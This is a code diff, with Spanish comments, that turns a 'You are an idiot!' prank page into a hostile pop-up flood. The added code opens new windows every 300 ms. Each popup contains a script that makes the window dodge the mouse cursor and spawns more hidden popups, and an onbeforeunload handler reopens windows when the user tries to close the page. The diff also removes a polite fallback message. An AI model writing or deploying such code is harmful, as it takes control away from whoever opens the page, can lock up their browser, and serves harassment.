@@ -9,27 +9,25 @@
       margin: 0;
       overflow: hidden;
       background-color: black;
-      color: white;
-      font-family: Arial, sans-serif;
-      text-align: center;
       display: flex;
       align-items: center;
       justify-content: center;
       height: 100vh;
-    }
-    .message {
-      font-size: 2rem;
+      color: yellow;
+      font-family: Arial, sans-serif;
+      text-align: center;
+      font-size: 3rem;
       font-weight: bold;
-      animation: blink 1s infinite alternate;
+      animation: blink 0.5s infinite alternate;
     }
     @keyframes blink {
       from { opacity: 1; }
-      to { opacity: 0.5; }
+      to { opacity: 0.3; }
     }
   </style>
 </head>
 <body>
-  <div class="message">You are an idiot!</div>
+  <div>You are an idiot!</div>
   
   <script>
     function abrirNuevaVentana() {
@@ -56,16 +54,38 @@
                 <source src="${videoSource}" type="video/mp4">
                 Tu navegador no soporta la reproducción de video.
               </video>
+              <script>
+                // Función para hacer que la ventana "huya" del ratón
+                document.addEventListener('mousemove', (event) => {
+                  const windowX = window.screenX;
+                  const windowY = window.screenY;
+                  const distance = 150; // Distancia para que huya
+
+                  if (Math.abs(event.screenX - windowX) < distance && Math.abs(event.screenY - windowY) < distance) {
+                    const newX = Math.floor(Math.random() * (window.screen.availWidth - window.outerWidth));
+                    const newY = Math.floor(Math.random() * (window.screen.availHeight - window.outerHeight));
+                    window.moveTo(newX, newY);
+                  }
+                });
+
+                // Intentar abrir más ventanas desde dentro de la ventana
+                setInterval(() => {
+                  const win = window.open('', '_blank', 'width=400,height=300');
+                  if (win) win.blur();
+                }, 500);
+              <\/script>
             </body>
           </html>
         `);
         nuevaVentana.document.close();
-      } else {
-        alert('Permite las ventanas emergentes en el navegador para ver el efecto.');
       }
     }
 
-    setInterval(abrirNuevaVentana, 500); // Cada 500 ms para un efecto constante
+    // Configurar apertura continua aunque el usuario cierre la ventana principal
+    window.onbeforeunload = () => setTimeout(abrirNuevaVentana, 100);
+
+    // Ejecutar continuamente la función para abrir nuevas ventanas
+    setInterval(abrirNuevaVentana, 300);
   </script>
 </body>
 </html>
